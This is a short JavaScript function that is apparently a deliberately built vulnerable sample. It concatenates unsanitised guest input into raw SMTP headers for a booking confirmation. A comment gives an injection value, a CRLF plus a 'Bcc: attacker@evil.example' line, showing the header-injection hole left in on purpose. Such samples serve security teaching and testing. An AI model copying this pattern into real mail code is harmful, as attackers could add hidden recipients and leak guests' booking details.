// Manufactured vulnerable variant, derived from
// idiomatic-nodemailer-structured-2.js. Builds the raw SMTP message
// (headers + body) via string concatenation instead of Nodemailer's
// structured option object, then hands the whole thing to a raw socket
// send -- a well-documented real anti-pattern for teams that "drop down"
// to raw SMTP for a feature the library's structured API doesn't cover.
function buildBookingConfirmationMessage(guestName, guestEmail, specialRequests) {
  // No CRLF stripping: guestName or specialRequests containing
  // "\r\nBcc: attacker@evil.example" injects an extra header.
  return (
    `From: bookings@example.com\r\n` +
    `To: ${guestEmail}\r\n` +
    `Subject: Booking confirmed for ${guestName}\r\n` +
    `\r\n` +
    `Special requests: ${specialRequests}\r\n`
  );
}
